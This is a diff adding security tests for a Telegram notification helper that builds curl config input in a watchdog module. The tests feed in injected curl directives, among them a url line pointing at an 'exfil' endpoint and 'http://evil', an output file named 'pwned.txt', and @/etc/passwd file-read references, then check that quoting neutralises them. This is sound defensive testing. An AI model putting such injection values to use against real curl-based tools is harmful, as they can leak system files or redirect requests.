@@ -1,9 +1,13 @@
 from __future__ import annotations
 
+import http.server
 import json
 import os
+import shutil
 import tempfile
+import threading
 import unittest
+import urllib.parse
 from pathlib import Path
 from unittest.mock import patch
 
@@ -193,6 +197,95 @@ class WatchdogProbeTest(unittest.TestCase):
                 watchdog.collect_checks(None)["серверный probe"],
                 "не удалось получить безопасный снимок",
             )
+
+
+class WatchdogNotifySecurityTest(unittest.TestCase):
+    def test_notify_blocks_curl_config_directive_injection(self) -> None:
+        hostile_text = (
+            'FilamentHub — API: bad "quote"\n'
+            'url = "http://127.0.0.1:9/exfil"\n'
+            'output = "pwned.txt"\r\n'
+            "@/etc/passwd \\ backslash"
+        )
+        with (
+            patch.dict(
+                os.environ,
+                {
+                    "BOT_TOKEN": '123456:ABC-DEF"\ninjected = "1"',
+                    "CHAT_ID": '-10042"\noutput = "bad"',
+                    "TELEGRAM_PROXY_URL": 'socks5h://127.0.0.1:1080"\nurl = "http://evil"',
+                },
+                clear=False,
+            ),
+            patch.object(watchdog.subprocess, "run") as run_mock,
+        ):
+            run_mock.return_value.returncode = 0
+            run_mock.return_value.stderr = ""
+            watchdog.notify(hostile_text)
+
+        run_mock.assert_called_once()
+        stdin_cfg: str = run_mock.call_args.kwargs["input"]
+        lines = stdin_cfg.splitlines()
+        directives = [line.split("=", 1)[0].strip() for line in lines]
+        self.assertEqual(
+            directives,
+            ["url", "data", "max-time", "silent", "show-error", "proxy"],
+        )
+        data_line = next(line for line in lines if line.startswith("data = "))
+        raw_form = data_line.split('"', 1)[1].rsplit('"', 1)[0]
+        decoded = urllib.parse.parse_qs(raw_form)
+        self.assertEqual(decoded["text"][0], hostile_text)
+        self.assertEqual(decoded["chat_id"][0], '-10042"\noutput = "bad"')
+
+    @unittest.skipUnless(shutil.which("curl"), "needs curl binary")
+    def test_notify_roundtrip_with_real_curl_against_loopback(self) -> None:
+        captured: dict[str, str] = {}
+
+        class Handler(http.server.BaseHTTPRequestHandler):
+            def do_POST(self) -> None:  # noqa: N802
+                length = int(self.headers.get("Content-Length", "0"))
+                captured["path"] = self.path
+                captured["body"] = self.rfile.read(length).decode("utf-8")
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'{"ok":true}')
+
+            def log_message(self, *_args: object) -> None:
+                return None
+
+        server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
+        port = server.server_port
+        worker = threading.Thread(target=server.handle_request, daemon=True)
+        worker.start()
+
+        hostile = 'alert "with quotes"\noutput = "should_not_exist.txt"\r\n@/etc/hosts'
+        real_quote = watchdog._curl_config_quote
+
+        def rewrite_to_loopback(val: str) -> str:
+            val = val.replace("https://api.telegram.org", f"http://127.0.0.1:{port}")
+            return real_quote(val)
+
+        try:
+            clean_env = {
+                k: v
+                for k, v in os.environ.items()
+                if k not in {"TELEGRAM_PROXY_URL", "TELEGRAM_PROXY", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "all_proxy"}
+            }
+            clean_env["BOT_TOKEN"] = "999:TEST_TOK"
+            clean_env["CHAT_ID"] = "-100777"
+            with (
+                patch.dict(os.environ, clean_env, clear=True),
+                patch.object(watchdog, "_curl_config_quote", side_effect=rewrite_to_loopback),
+            ):
+                watchdog.notify(hostile)
+            worker.join(timeout=3)
+        finally:
+            server.server_close()
+
+        self.assertEqual(captured.get("path"), "/bot999:TEST_TOK/sendMessage")
+        parsed = urllib.parse.parse_qs(captured.get("body", ""))
+        self.assertEqual(parsed.get("chat_id"), ["-100777"])
+        self.assertEqual(parsed.get("text"), [hostile])
 
 
 if __name__ == "__main__":
